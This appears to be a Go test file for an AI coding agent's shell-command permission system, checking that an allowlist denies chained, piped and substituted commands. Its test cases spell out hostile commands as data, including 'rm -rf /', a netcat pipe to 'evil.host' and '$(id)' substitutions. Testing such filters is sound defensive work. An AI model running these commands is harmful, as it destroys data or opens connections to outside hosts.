package permission

import (
	"context"
	"runtime"
	"testing"

	"github.com/stretchr/testify/require"
)

type carrierParams struct {
	command string
}

func (c carrierParams) CommandText() string { return c.command }

func TestCommandMatchesAllowlist(t *testing.T) {
	t.Parallel()

	allow := []string{"git", "go build", "go test", "gh"}
	entries := parseAllowEntries(allow)

	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"bare program", "git status", true},
		{"prefix entry match", "go build ./...", true},
		{"prefix entry mismatch", "go clean -cache", false},
		{"unknown program", "rm -rf /", false},
		{"path-prefixed program", "/usr/bin/git status", true},
		{"case-insensitive program", "GIT status", true},
		{"compound both allowed", "git add -A && git commit -m 'msg'", true},
		{"compound one denied", "git status && rm -rf /", false},
		{"pipeline both allowed", "git log | gh pr create", true},
		{"pipeline one denied", "git log | nc evil.host 1234", false},
		{"semicolon statements both allowed", "git status; go build", true},
		{"semicolon one denied", "git status; rm -rf /", false},
		{"command substitution denied", "git log $(whoami)", false},
		{"process substitution denied", "go build <(echo x)", false},
		{"subshell denied", "(git status)", false},
		{"dynamic program denied", "$CMD status", false},
		{"bare assignment denied", "FOO=bar", false},
		{"assignment with allowed call", "FOO=bar git status", true},
		{"assignment with substitution denied", "FOO=$(id) git status", false},
		{"argument expansion with program-only entry", "git checkout $BRANCH", true},
		{"argument expansion with prefix entry", "go $SUBCMD ./...", false},
		{"parse failure denied", "git status &&", false},
		{"empty command denied", "", false},
		{"redirect on allowed program", "git log > /tmp/out.txt", true},
		{"bare redirect denied", "> out.txt", false},
		{"redirect with substitution denied", `git log > "$(id)"`, false},
		{"if body allowed", "if git status; then git log; fi", true},
		{"if body denied", "if git status; then rm -rf /; fi", false},
		{"if condition denied", "if rm -rf /; then git log; fi", false},
		{"elif else denied", "if git status; then git log; else rm -rf /; fi", false},
		{"while body denied", "while git status; do rm -rf /; done", false},
		{"for body allowed", "for f in a b; do git status; done", true},
		{"for items substitution denied", "for f in $(ls); do git status; done", false},
		{"case body denied", "case x in y) rm -rf / ;; esac", false},
		{"case pattern substitution denied", "case $(id) in y) git status ;; esac", false},
		{"declare literal allowed", "local FOO=bar && git status", true},
		{"declare substitution denied", "local FOO=$(id) && git status", false},
		{"c-style for denied", "for ((i=0; i<3; i++)); do git status; done", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			require.Equal(t, tt.want, commandMatchesAllowlist(tt.command, entries))
		})
	}
}

func TestCommandMatchesAllowlistEmptyAllowlist(t *testing.T) {
	t.Parallel()
	require.False(t, commandMatchesAllowlist("git status", nil))
	require.False(t, commandMatchesAllowlist("git status", map[string][][]string{}))
}

// TestCommandMatchesAllowlistWindowsExe pins the platform split in
// normalizeCmdName: on Windows the .exe suffix is stripped so
// git.exe matches the git entry; elsewhere foo.exe is a legitimate
// distinct program name and must not alias onto the bare entry.
func TestCommandMatchesAllowlistWindowsExe(t *testing.T) {
	t.Parallel()

	entries := parseAllowEntries([]string{"git"})
	got := commandMatchesAllowlist(`"C:/Program Files/Git/bin/git.exe" status`, entries)
	if runtime.GOOS == "windows" {
		require.True(t, got, "git.exe must match the git entry on Windows")
	} else {
		require.False(t, got, "git.exe is a distinct program name on non-Windows hosts")
	}
}

// TestCommandMatchesAllowlistArgumentTokensLiteral pins that prefix
// entries compare argument tokens verbatim: basename-normalizing them
// would alias distinct paths onto one entry.
func TestCommandMatchesAllowlistArgumentTokensLiteral(t *testing.T) {
	t.Parallel()

	entries := parseAllowEntries([]string{"rm allowed/file.txt"})
	require.True(t, commandMatchesAllowlist("rm allowed/file.txt", entries))
	require.False(t, commandMatchesAllowlist("rm private/file.txt", entries),
		"different path with the same basename must not match")
}

func TestAllowCommandsAutoApproves(t *testing.T) {
	t.Parallel()

	svc := NewPermissionService("/tmp", false, nil, []string{"git", "go build"})
	granted, err := svc.Request(context.Background(), CreatePermissionRequest{
		SessionID:  "s1",
		ToolCallID: "call-1",
		ToolName:   "bash",
		Action:     "execute",
		Path:       "/tmp",
		Params:     carrierParams{command: "git status"},
	})
	require.NoError(t, err)
	require.True(t, granted)
}

func TestAllowCommandsDoesNotAutoApproveMismatch(t *testing.T) {
	t.Parallel()

	svc := NewPermissionService("/tmp", false, nil, []string{"git"})
	ctx, cancel := context.WithCancel(context.Background())
	// Cancel before Request so the request reaches the interactive prompt
	// path and is cancelled with the context rather than blocking on a
	// human resolver.
	cancel()

	granted, err := svc.Request(ctx, CreatePermissionRequest{
		SessionID:  "s1",
		ToolCallID: "call-2",
		ToolName:   "bash",
		Action:     "execute",
		Path:       "/tmp",
		Params:     carrierParams{command: "rm -rf /"},
	})
	require.ErrorIs(t, err, context.Canceled)
	require.False(t, granted)
}

func TestMatchesAllowlistExported(t *testing.T) {
	t.Parallel()

	// The exported wrapper backs tools.bash.auto_escalate_commands: same
	// argv-verified, deny-by-default semantics as permissions.allow_commands.
	require.True(t, MatchesAllowlist([]string{"git", "go build"}, "git status && go build ./..."))
	require.False(t, MatchesAllowlist([]string{"git"}, "git status && rm -rf /"))
	require.False(t, MatchesAllowlist([]string{"go"}, "python script.py"))
	require.False(t, MatchesAllowlist(nil, "git status"), "empty allowlist denies by default")
}

func TestAllowCommandsBypassShortcutsStillPrompts(t *testing.T) {
	t.Parallel()

	svc := NewPermissionService("/tmp", false, nil, []string{"git"})
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	// BypassShortcuts (sandbox escalation) must ignore the allowlist and
	// always reach the interactive prompt.
	granted, err := svc.BypassShortcuts(ctx, CreatePermissionRequest{
		SessionID:  "s1",
		ToolCallID: "call-3",
		ToolName:   "bash",
		Action:     "execute",
		Path:       "/tmp",
		Params:     carrierParams{command: "git status"},
	})
	require.ErrorIs(t, err, context.Canceled)
	require.False(t, granted)
}

func TestAllowCommandsSkippedForNonCommandTools(t *testing.T) {
	t.Parallel()

	svc := NewPermissionService("/tmp", false, nil, []string{"git"})
	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	// Params without the CommandCarrier interface (e.g. file tools) are
	// unaffected by the allowlist and still prompt.
	granted, err := svc.Request(ctx, CreatePermissionRequest{
		SessionID:  "s1",
		ToolCallID: "call-4",
		ToolName:   "edit",
		Action:     "write",
		Path:       "/tmp",
		Params:     map[string]any{"path": "/tmp/x"},
	})
	require.ErrorIs(t, err, context.Canceled)
	require.False(t, granted)
}
